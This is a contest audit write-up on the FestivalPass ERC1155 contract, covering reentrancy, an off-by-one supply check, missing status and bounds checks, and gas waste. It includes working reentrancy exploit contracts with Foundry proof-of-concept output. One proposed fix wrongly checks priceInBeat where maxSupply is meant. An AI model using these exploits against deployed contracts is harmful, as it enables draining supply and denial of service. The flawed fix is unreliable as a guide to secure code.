# [2025-07-beatland-festival](https://codehawks.cyfrin.io/c/2025-07-beatland-festival)

### Overview
ERC1155 contain
- regular pass: `tokenId = 1, 2, 3`
- token (`tokenId = encodeTokenId(collectionId, itemId)`)

### Finding
- `configurePass()`: can reset current `passId` supply ? it doesn't check if `passId` has been configured ?
- `buyPass()`: Reentrant ? ✅ (`test_buyPass_reentrant()`)
- `createPerformance()`: doesn't check `if reward > 0` ? ✅
- `createMemorabiliaCollection()`: can't activate collection if created with `isActive = false` ? ✅ (`test_RedeemMemorabilia_CollectionNotActive()`)
- `redeemMemorabilia()`:
    - DoS since `redeemMemorabilia()` allow reentrancy ? ✅
    - Last Item can't be minted due to incorrect check of `collection.maxSupply` ? ✅ (`test_RedeemMemorabilia_LastItemFailed()`)
- `uri()`, `getMemorabiliaDetails()`: doesn't check if `itemId` exist ? ✅ (`test_GetMemorabiliaDetails_InvalidItemId()`)
- `getUserMemorabiliaDetailed()`: gas efficiency ? ✅ (`test_GetUserMemorabiliaDetailed_GasCost()`)


### Missed
- `H-01. Pass Lending Reward Multiplication Enables Unlimited Performance Rewards`: 一個 `pass` 對一個 `performance` 當然只能用一次
- `M-01. Reseting the current pass supply`: 這個也算？

## ✅ Root + Impact: Reentrancy Vulnerabilities on buyPass()

### Description
- `FestivalPass` contract allows users to buy a pass with specified price, with a maximum supply limit
- According to the design of `ERC1155`, `_mint()` will call `checkOnERC1155Received()` or `checkOnERC1155BatchReceived()` to ensure the recipient can indeed receive token, which creates an opportunity for reentrancy
- Inisde `buyPass()`, `passSupply` is updated after `_mint()` executed, which allow malicious users to re-enter `buyPass()` and bypass the maximum supply check
- In addition, allowing reentrancy for `buyPass()` may lead to DoS where a malicious user purchases all available passes in a single transaction, preventing others from buying them

```solidity
@> // no reentrancy guard
function buyPass(uint256 collectionId) external payable {
    require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
    require(msg.value == passPrice[collectionId], "Incorrect payment amount");
    require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
    
    _mint(msg.sender, collectionId, 1, "");
@>  // passSupply is updated after _mint()
    ++passSupply[collectionId];
    
    uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
    if (bonus > 0) {
        // Mint BEAT tokens to buyer
        BeatToken(beatToken).mint(msg.sender, bonus);
    }
    emit PassPurchased(msg.sender, collectionId);
}
```

### Risk

**Likelihood**:
- Reentrancy is a well-known and commonly exploited vulnerability, especially in token contracts that interact with untrusted recipients.
- Once `passSupply` is closed to `passMaxSupply` or attacker has enough fund, this vulnerability will be exploited in a single transaction, no special privileges are required

**Impact**:
- Break the core business logic and trust assumptions of the protocol
- **DoS**: Other legitimate users will be unable to purchase passes

### Proof of Concept
Add the following test and exploit contract:
```solidity
// add this test
function test_buyPass_reentrant() public {
    // Configure a pass with max supply of 1
    vm.prank(organizer);
    festivalPass.configurePass(1, GENERAL_PRICE, 1);
    assertEq(festivalPass.passMaxSupply(1), 1);
    console.log("General Pass max supply: ", festivalPass.passMaxSupply(1));

    vm.startPrank(user1);
    ReentrancyPass exploit = new ReentrancyPass{value: 0.5 ether}(festivalPass, beatToken);
    exploit.exploit();
    vm.stopPrank();
    assertEq(festivalPass.balanceOf(address(exploit), 1), 2);
    console.log("Exploit has purchased %s passes: ", festivalPass.balanceOf(address(exploit), 1));
}


// attack contract
contract ReentrancyPass is IERC1155Receiver {
    FestivalPass public festivalPass;
    BeatToken public beatToken;

    uint256 mint_amount;

    constructor(FestivalPass _festivalPass, BeatToken _beatToken) payable {
        festivalPass = _festivalPass;
        beatToken = _beatToken;
    }

    function exploit() external {
        festivalPass.buyPass{value: 0.05 ether}(1);
    }

    function onERC1155Received (
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {

        // mint one more pass
        if (++mint_amount < 2) {
            festivalPass.buyPass{value: 0.05 ether}(1);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived (
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }

    receive() external payable {
        
    }
}
```
PoC Results:
```
forge test -vv --match-test test_buyPass_reentrant
[⠊] Compiling...
[⠘] Compiling 2 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 762.66ms

Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
[PASS] test_buyPass_reentrant() (gas: 680898)
Logs:
  General Pass max supply:  1
  Exploit has purchased 2 passes: 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.29ms (6.47ms CPU time)

Ran 1 test suite in 273.39ms (37.29ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
To prevent from breaking maximum supply limit, simply follow **Checks-Effects-Interactions** Pattern: update `passSupply` before executing `_mint()`
```diff
function buyPass(uint256 collectionId) external payable {
    ...
+   ++passSupply[collectionId];
    _mint(msg.sender, collectionId, 1, "");
-   ++passSupply[collectionId];
    ...
}
```
To prevent reentrancy, use `ReentrancyGuard` provided by Openzeppelin

---

## ✅ Root + Impact: Last Item can never be minted due to logic error of `collection.maxSupply` check

### Description
- Each `MemorabiliaCollection` struct contains a `maxSupply` field specifying the maximum number of mintable items in the collection
- However, the incorrect check of `maxSupply` inside `redeemMemorabilia()` will result in last items always being unmintable
```solidity
function redeemMemorabilia(uint256 collectionId) external {
    MemorabiliaCollection storage collection = collections[collectionId];
    require(collection.priceInBeat > 0, "Collection does not exist");
    require(collection.isActive, "Collection not active");
@>  // below check misuse `<`, should be `<=`
    require(collection.currentItemId < collection.maxSupply, "Collection sold out");

    
    BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);

    uint256 itemId = collection.currentItemId++;
    uint256 tokenId = encodeTokenId(collectionId, itemId);

    tokenIdToEdition[tokenId] = itemId;

    _mint(msg.sender, tokenId, 1, "");

    emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
}
```

### Risk

**Likelihood**:
- It always happen on every collection

**Impact**:
- Undermines the integrity of the collection’s supply logic
- Undermines user expectation and trust

### Proof of Concept
Add the following test and run this command: `forge test -vv --match-test test_RedeemMemorabilia_LastItemFailed`
```solidity
function test_RedeemMemorabilia_LastItemFailed() public {
    // Setup collection
    vm.prank(organizer);
    uint256 collectionId = festivalPass.createMemorabiliaCollection(
        "Limited Shirts",
        "ipfs://QmShirts",
        50e18,
        3,
        true
    );

    (string memory name, , , uint256 maxSupply, ,) = festivalPass.collections(collectionId);
    console.log("Collection name: %s, max supply: ", name, maxSupply);

    // Give users BEAT tokens
    vm.prank(address(festivalPass));
    beatToken.mint(user1, 200e18);

    // User1 tries to redeem all items
    console.log("Try to mint %s items", maxSupply);
    vm.startPrank(user1);
    for (uint i = 0; i < maxSupply; i++) {
        if (i == maxSupply - 1) {
            // Last item should fail
            vm.expectRevert("Collection sold out");
        }   
        festivalPass.redeemMemorabilia(collectionId);
    }
    vm.stopPrank();

    console.log("Failed to mint last item");
}
```
PoC Results:
```
forge test -vv --match-test test_RedeemMemorabilia_LastItemFailed
[⠊] Compiling...
[⠘] Compiling 1 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 757.13ms
Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
[PASS] test_RedeemMemorabilia_LastItemFailed() (gas: 356357)
Logs:
  Collection name: Limited Shirts, max supply:  3
  Try to mint 3 items
  Failed to mint last item

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.84ms (1.09ms CPU time)

Ran 1 test suite in 243.65ms (7.84ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Use `<=` rather than `<` in the check
```diff
function redeemMemorabilia(uint256 collectionId) external {
    ...
+   require(collection.currentItemId <= collection.maxSupply, "Collection sold out");
-   require(collection.currentItemId < collection.maxSupply, "Collection sold out");
    ...
}
```

---

## ✅ Root + Impact: Collection remains permanently inactive due to the absence of a status update mechanism

### Description
- Each `MemorabiliaCollection` struct contains a `isActive` field indicating whether redemption is currently enabled for this collection
- By observeing the code (e.g., see where does keyword `isActive` appear), we can find that while this field is set during creation, the current implementation lacks a mechanism to update it once initialized

### Risk
**Likelihood**:
- Once a collection is created and initialized as inactive, it becomes irredeemable and effectively dead

**Impact**:
- **User Confusion and Trust Degradation**: Users may perceive the system as unreliable if seemingly valid collections are non-functional, damaging platform trust

### Proof of Concept
Simply run the existing test `test_RedeemMemorabilia_CollectionNotActive()`

### Recommended Mitigation
- Add a function only callable by organizer to set collection's status, for example:
    ```solidity
    fucntion activateCollection(uint256 collectionId) external onlyOrganizer {
        require(collections[collectionId].priceInBeat > 0, "Collection does not exist");
        collections[collectionId].isActive = true;
    }
    ```
- Introduce a time-based mechanism that automatically updated the collection’s status based on its configured activation timestamp.

---

## ❌ Root + Impact: Reentrancy Vulnerability in Memorabilia NFT Redemption Logic

#### Description
- The `FestivalPass` contract allows users to redeem unique memorabilia NFTs sequentially from a specified `collectionId`, with each collection enforcing a maximum supply limit
- According to the `ERC1155` standard, `_mint()` will invoke `checkOnERC1155Received()` or `checkOnERC1155BatchReceived()`, which performs a callback to the recipient contract to ensure it can accept the token, which is known to introduces a vector for reentrancy attacks.
- Since `redeemMemorabilia()` lacks reentrancy protection, As a result, an attacker can deploy a malicious contract, initiate a call to `redeemMemorabilia()`, and recursively re-enter the function via `onERC1155Received()` to drain the entire collection in a single transaction.

```solidity
@> // lack reentrancy protection such as `nonReentrant` provided by Openzeppelin
function redeemMemorabilia(uint256 collectionId) external {
    ...
}
```

### Risk
**Likelihood**:
- Reentrancy attacks are well-known and widely exploited
- Since the redemption process only requires a sufficient balance of `BeatToken`, any user or contract holding enough tokens can exploit the vulnerability without needing special privileges.

**Impact**:
- **DoS**: Legitimate users will be unable to redeem memorabilia from affected collections
- **Economic Disruption**: If memorabilia NFTs have collectible or monetary value, the attacker may extract outsized economic benefits
- **User Trust Degradation**: The unexpected depletion of a collection’s supply undermines user confidence in the platform’s fairness, reliability, and security.

### Proof of Concept
Add the following test and exploit contract, then run the command: `forge test -vv --match-test test_RedeemMemorabilia_DoS`
```solidity
// add this test
function test_RedeemMemorabilia_DoS() public {
    // Setup collection
    vm.prank(organizer);
    uint256 _maxSupply = 5;
    uint256 collectionId = festivalPass.createMemorabiliaCollection(
        "DoS Collection",
        "ipfs://QmDoS",
        50e18,
        _maxSupply,
        true
    );

    // Deplot exploit contract then perform DoS attack
    console.log("User 1 deploys exploit contract and redeems all items from collection");
    vm.prank(user1);
    ReentrancyCollection exploit = new ReentrancyCollection(
        festivalPass, 
        beatToken, 
        collectionId,
        _maxSupply - 1  // logic error in `redeemMemorabilia()` allows minting one less than max supply
    );
    vm.prank(address(festivalPass));
    beatToken.mint(address(exploit), 200e18);

    exploit.exploit();

    // User2 tries to redeem item
    vm.prank(address(festivalPass));
    beatToken.mint(user2, 200e18);

    vm.prank(user2);
    vm.expectRevert("Collection sold out");
    festivalPass.redeemMemorabilia(collectionId);

    console.log("User2 failed to redeem item");
}


// Exploit contract
contract ReentrancyCollection is IERC1155Receiver {
    FestivalPass public _festivalPass;
    BeatToken public _beatToken;
    
    uint256 _colectionId;
    uint256 _maxSupply;
    uint256 _mint_amount;

    constructor(FestivalPass festivalPass, BeatToken beatToken, uint256 colectionId, uint256 maxSupply) payable {
        _festivalPass = festivalPass;
        _beatToken = beatToken;
        _colectionId = colectionId;
        _maxSupply = maxSupply;
    }

    function exploit() external {
        _festivalPass.redeemMemorabilia(_colectionId);
    }

    function onERC1155Received (
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {

        // mint all items in the collection
        if (++_mint_amount < _maxSupply) {
            _festivalPass.redeemMemorabilia(_colectionId);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived (
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }

    receive() external payable {
        
    }
}
```
PoC Results:
```
forge test -vv --match-test test_RedeemMemorabilia_DoS
[⠊] Compiling...
[⠑] Compiling 1 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 712.73ms
Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
[PASS] test_RedeemMemorabilia_DoS() (gas: 1069835)
Logs:
  User 1 deploys exploit contract and redeems all items from collection
  User2 failed to redeem item

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.89ms (1.41ms CPU time)

Ran 1 test suite in 232.03ms (6.89ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Use `ReentrancyGuard` provided by Openzeppelin

```diff
+ function redeemMemorabilia(uint256 collectionId) external nonReentrant {
- function redeemMemorabilia(uint256 collectionId) external {
    MemorabiliaCollection storage collection = collections[collectionId];
    require(collection.priceInBeat > 0, "Collection does not exist");
    require(collection.isActive, "Collection not active");
    require(collection.currentItemId < collection.maxSupply, "Collection sold out");

    // Burn BEAT tokens
    BeatToken(beatToken).burnFrom(msg.sender, collection.priceInBeat);

    // Generate unique token ID
    uint256 itemId = collection.currentItemId++;
    uint256 tokenId = encodeTokenId(collectionId, itemId);

    // Store edition number
    tokenIdToEdition[tokenId] = itemId;

    // Mint the unique NFT
    _mint(msg.sender, tokenId, 1, "");

    emit MemorabiliaRedeemed(msg.sender, tokenId, collectionId, itemId);
}
```

### Judgement
**No added advantage over normal batching**\

A user with enough `BEAT` could already call `redeemMemorabilia` in a loop or use an AA batch to acquire all items. Moving that loop into `onERC1155Received` provides no economic or timing benefit.

---

## ❌ Root + Impact: Gas Inefficiency in `getUserMemorabiliaDetailed()` Due to Unoptimized Looping and Storage Access

### Description
- The current implementation of `getUserMemorabiliaDetailed()` is highly gas inefficient.
- Although the global state variable `nextCollectionId` starts from `100`, the outer loop begins iteration from `cId = 1`, resulting in unnecessary loop executions over unused or non-existent collection IDs.
- Additionally, both the outer and inner loops repeatedly access state variables (`nextCollectionId` and `collections[cId].currentItemId`), which are stored in contract storage. These epeated SLOAD operations in each iteration result in additional gas cost.

### Risk
**Likelihood**:
- This inefficiency incurs gas overhead every time `getUserMemorabiliaDetailed()` is invoked

**Impact**:
- While this is not a direct security vulnerability, it increases gas costs for users interacting with the function on-chain
- It may discourage usage if the function is part of a core user experience, such as displaying collected memorabilia.

### Proof of Concept
Add the following test, then run the command: `forge test -vv --match-test test_GetUserMemorabiliaDetailed_GasCost`
```solidity
function test_GetUserMemorabiliaDetailed_GasCost() public {
    // Create 2 collections
    vm.startPrank(organizer);
    festivalPass.createMemorabiliaCollection("Col1", "ipfs://1", 50e18, 5, true);
    festivalPass.createMemorabiliaCollection("Col2", "ipfs://2", 75e18, 5, true);
    vm.stopPrank();

    // Analyze gas cost
    uint256 gasStart = gasleft();
    festivalPass.getUserMemorabiliaDetailed(user1);
    uint256 gasUsed = gasStart - gasleft();
    console.log("Gas used for getUserMemorabiliaDetailed: %s", gasUsed);
}
```

PoC Results:
```
forge test -vv --match-test test_GetUserMemorabiliaDetailed_GasCost
[⠊] Compiling...
[⠘] Compiling 1 files with Solc 0.8.25
[⠃] Solc 0.8.25 finished in 751.12ms
Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
[PASS] test_GetUserMemorabiliaDetailed_GasCost() (gas: 585043)
Logs:
  Gas used for getUserMemorabiliaDetailed: 281061

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.34ms (1.29ms CPU time)

Ran 1 test suite in 227.47ms (7.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
- Let `cId` start from `100`, result gas cost:
    ```
    forge test -vv --match-test test_GetUserMemorabiliaDetailed_GasCost
    [⠊] Compiling...
    [⠘] Compiling 4 files with Solc 0.8.25
    [⠃] Solc 0.8.25 finished in 765.95ms
    Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
    [PASS] test_GetUserMemorabiliaDetailed_GasCost() (gas: 312397)
    Logs:
      Gas used for getUserMemorabiliaDetailed: 8415

    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.66ms (1.23ms CPU time)

    Ran 1 test suite in 228.28ms (7.66ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
    ```
- Furthermore, create a local copy of `nextCollectionId` and `collections[cId].currentItemId`, resulting gas cost:
    ```
    forge test -vv --match-test test_GetUserMemorabiliaDetailed_GasCost
    [⠊] Compiling...
    [⠘] Compiling 4 files with Solc 0.8.25
    [⠃] Solc 0.8.25 finished in 745.99ms
    Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
    [PASS] test_GetUserMemorabiliaDetailed_GasCost() (gas: 311957)
    Logs:
      Gas used for getUserMemorabiliaDetailed: 7975

    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.07ms (1.02ms CPU time)

    Ran 1 test suite in 226.89ms (6.07ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
    ```

Final version:
```diff!
function getUserMemorabiliaDetailed(address user) external view returns (
    uint256[] memory tokenIds,
    uint256[] memory collectionIds,
    uint256[] memory itemIds
) {
    uint256 count = 0;
+   uint256 localNextCollectionId = nextCollectionId;
+   for (uint256 cId = 100; cId < localNextCollectionId; cId++) {
-   for (uint256 cId = 1; cId < nextCollectionId; cId++) {
+       uint256 currentItemId = collections[cId].currentItemId;
+       for (uint256 iId = 1; iId < currentItemId; iId++) {
-       for (uint256 iId = 1; iId < collections[cId].currentItemId; iId++) {
            uint256 tokenId = encodeTokenId(cId, iId);
            if (balanceOf(user, tokenId) > 0) {
                count++;
            }
        }
    }

    tokenIds = new uint256[](count);
    collectionIds = new uint256[](count);
    itemIds = new uint256[](count);

    uint256 index = 0;
+   for (uint256 cId = 100; cId < localNextCollectionId; cId++) {
-   for (uint256 cId = 1; cId < nextCollectionId; cId++) {
+       uint256 currentItemId = collections[cId].currentItemId;
+       for (uint256 iId = 1; iId < currentItemId; iId++) {
-       for (uint256 iId = 1; iId < collections[cId].currentItemId; iId++) {
            uint256 tokenId = encodeTokenId(cId, iId);
            if (balanceOf(user, tokenId) > 0) {
                tokenIds[index] = tokenId;
                collectionIds[index] = cId;
                itemIds[index] = iId;
                index++;
            }
        }
    }

    return (tokenIds, collectionIds, itemIds);
}
```

## ✅ Root + Impact: Missing Bounds Check on itemId in `uri()` and `getMemorabiliaDetails()`

### Description
- After decoding `tokenId` into `collectionId` and `itemId`, both `uri()` and `getMemorabiliaDetails()` lack the check if `itemId` excesses maximum supply

```solidity
function uri(uint256 tokenId) public view override returns (string memory) {
    if (tokenId <= BACKSTAGE_PASS) {
        return string(abi.encodePacked("ipfs://beatdrop/", Strings.toString(tokenId)));
    }

    (uint256 collectionId, uint256 itemId) = decodeTokenId(tokenId);

    if (collections[collectionId].priceInBeat > 0) {
@>      // lack the check if itemId > collections[collectionId].maxSupply
        return string(abi.encodePacked(
            collections[collectionId].baseUri,
            "/metadata/",
            Strings.toString(itemId)
        ));
    }

    return super.uri(tokenId);
}

function getMemorabiliaDetails(uint256 tokenId) external view returns (
    uint256 collectionId,
    uint256 itemId,
    string memory collectionName,
    uint256 editionNumber,
    uint256 maxSupply,
    string memory tokenUri
) {
    (collectionId, itemId) = decodeTokenId(tokenId);
    MemorabiliaCollection memory collection = collections[collectionId];

    require(collection.priceInBeat > 0, "Invalid token");
@>  // lack the check if itemId > collection.maxSupply 
    return (
        collectionId,
        itemId,
        collection.name,
        itemId, // Edition number is the item ID
        collection.maxSupply,
        uri(tokenId)
    );
}
```

### Risk
**Likelihood**:
- Anyone can simply call these functions with non-exist `tokenId` to get the fake `uri` and Memorabilia Detail

**Impact**:
- **User confusion or UI inconsistencies** (e.g., ghost items showing up in wallets or collections).
- **Potential abuse in off-chain indexing** (e.g., platforms misrepresenting total supply or available items).

### Proof of Concept
Add the following test and run the command: `forge test -vv --match-test test_GetMemorabiliaDetails_InvalidItemId`
```solidity
function test_GetMemorabiliaDetails_InvalidItemId() public {
    // Setup
    vm.prank(organizer);
    uint256 collectionId = festivalPass.createMemorabiliaCollection(
        "Detail Test",
        "ipfs://QmDetail",
        100e18,
        5,
        true
    );

    // Get details for item #6 although maxSupply == 5
    uint256 tokenId = festivalPass.encodeTokenId(collectionId, 6);
    (
        uint256 retColId,
        uint256 retItemId,
        string memory colName,
        uint256 edition,
        uint256 maxSupply,
        string memory tokenUri
    ) = festivalPass.getMemorabiliaDetails(tokenId);

    console.log("Details for item #6 is retrieved, despite max supply being 5:\n");
    console.log("Collection ID: ", retColId);
    console.log("Item ID: ", retItemId);        
    console.log("Collection Name: ", colName);
    console.log("Edition: ", edition);
    console.log("Max Supply: ", maxSupply);
    console.log("Token URI: ", tokenUri);
}
```

PoC Results:
```
forge test -vv --match-test test_GetMemorabiliaDetails_InvalidItemId
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.25
[⠢] Solc 0.8.25 finished in 1.07s
Ran 1 test for test/FestivalPass.t.sol:FestivalPassTest
[PASS] test_GetMemorabiliaDetails_InvalidItemId() (gas: 178950)
Logs:
  Details for item #6 is retrieved, despite max supply being 5:

  Collection ID:  100
  Item ID:  6
  Collection Name:  Detail Test
  Edition:  6
  Max Supply:  5
  Token URI:  ipfs://QmDetail/metadata/6

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.20ms (1.70ms CPU time)

Ran 1 test suite in 329.01ms (8.20ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Add `itemId` check on both `uri()` and `getMemorabiliaDetails()`
```diff
function uri(uint256 tokenId) public view override returns (string memory) {
    if (tokenId <= BACKSTAGE_PASS) {
        return string(abi.encodePacked("ipfs://beatdrop/", Strings.toString(tokenId)));
    }

    (uint256 collectionId, uint256 itemId) = decodeTokenId(tokenId);

    if (collections[collectionId].priceInBeat > 0) {
+       if (collections[collectionId].maxSupply < itemId) return super.uri(tokenId);
        return string(abi.encodePacked(
            collections[collectionId].baseUri,
            "/metadata/",
            Strings.toString(itemId)
        ));
    }

    return super.uri(tokenId);
}

function getMemorabiliaDetails(uint256 tokenId) external view returns (
    uint256 collectionId,
    uint256 itemId,
    string memory collectionName,
    uint256 editionNumber,
    uint256 maxSupply,
    string memory tokenUri
) {
    (collectionId, itemId) = decodeTokenId(tokenId);
    MemorabiliaCollection memory collection = collections[collectionId];

    require(collection.priceInBeat > 0, "Invalid token");
+   require(collection.priceInBeat >= itemId, "Invalid token");
    return (
        collectionId,
        itemId,
        collection.name,
        itemId, // Edition number is the item ID
        collection.maxSupply,
        uri(tokenId)
    );
}
```

## ❌ Root + Impact: Lack of Reward Validation in `createPerformance()` Enables Rewardless Events

### Description
- `Organizer` is responsible to create a performance with a specified `startTime`, `duration`, and `reward`, enabling users with pass to attend and earn BEAT tokens
- Inside `createPerformance()`, it carefully checks both the validity of `startTime` and `duration`, but it doesn't check whether `reward > 0`, i.e., whether created performance has no reward

```solidity
function createPerformance(
    uint256 startTime,
    uint256 duration,
    uint256 reward
) external onlyOrganizer returns (uint256) {
    require(startTime > block.timestamp, "Start time must be in the future");
    require(duration > 0, "Duration must be greater than 0");
@>  // lack check if reward > 0
    performances[performanceCount] = Performance({
        startTime: startTime,
        endTime: startTime + duration,
        baseReward: reward
    });
    emit PerformanceCreated(performanceCount, startTime, startTime + duration);
    return performanceCount++;
}
```

### Risk
**Likelihood**:
- Occurs when `organizer` accidentally set `baseReward` to `0`

**Impact**:
- **Wasted User Actions and Gas**: Users spend gas to call `attendPerformance()` expecting a reward, but ultimately receive nothing
- **User Trust Degradation**: This breaks user expectations and may erode trust in the platform’s reliability

### Proof of Concept
It’s straightforward to understand the impact by inspecting the code logic

### Recommended Mitigation
Add a validation check to ensure that `reward` is greater than zero in `createPerformance()`
```diff
function createPerformance(
    uint256 startTime,
    uint256 duration,
    uint256 reward
) external onlyOrganizer returns (uint256) {
    require(startTime > block.timestamp, "Start time must be in the future");
    require(duration > 0, "Duration must be greater than 0");
+   require(reward > 0, "Reward must be greater than 0");
    performances[performanceCount] = Performance({
        startTime: startTime,
        endTime: startTime + duration,
        baseReward: reward
    });
    emit PerformanceCreated(performanceCount, startTime, startTime + duration);
    return performanceCount++;
}
```
